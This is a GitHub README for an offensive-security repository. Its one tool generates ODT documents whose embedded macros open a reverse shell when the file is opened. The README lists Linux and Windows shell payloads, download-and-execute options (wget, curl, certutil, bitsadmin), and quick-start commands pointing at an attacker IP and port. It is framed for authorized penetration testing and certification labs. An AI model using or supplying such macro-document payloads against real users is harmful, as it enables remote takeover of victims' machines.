# RedTeam-Arsenal

**Author: Abdulrahman Mustafa**

A collection of offensive security tools for authorized red team operations, penetration testing, and security certification labs (OSCP, CPTS).

> **For authorized engagements only.**

## Tools

### [odt-revshell-generator](odt-revshell-generator/)

Generates malicious ODT files with embedded LibreOffice Basic macros that auto-execute a reverse shell on document open.

```bash
# Download this tool only
git clone --depth 1 --filter=blob:none --sparse https://github.com/3pdoul/RedTeam-Arsenal.git && cd RedTeam-Arsenal && git sparse-checkout set odt-revshell-generator
```

- **33 payloads** — 22 Linux + 11 Windows
- **Linux**: bash, nc (6 variants incl. download-and-execute), ncat, ncat-ssl, socat, python/python3, perl, php, ruby, node, telnet, openssl, awk, lua
- **Windows**: PowerShell (standard, try-catch, TLS), nc.exe (local + 3 download methods), python, perl, ruby, node
- **Download & execute**: fetch nc from attacker HTTP server via wget, curl, fetch, certutil, PowerShell, or bitsadmin
- **Custom commands**: `--cmd` for arbitrary payloads, `--pre-cmd` for staging commands before the shell
- Zero dependencies — Python 3 stdlib only

```bash
# Quick start
python3 odt-revshell-generator/odt-revshell-generator.py 10.10.14.5 4444
python3 odt-revshell-generator/odt-revshell-generator.py 10.10.14.5 4444 --os windows -p powershell-tls
python3 odt-revshell-generator/odt-revshell-generator.py 10.10.14.5 4444 -p nc-download-wget --http-port 8080
python3 odt-revshell-generator/odt-revshell-generator.py --list
```

## Disclaimer

All tools in this repository are intended for authorized penetration testing, red team operations, and security certification labs only. Unauthorized use against systems you do not own or have explicit written permission to test is illegal.
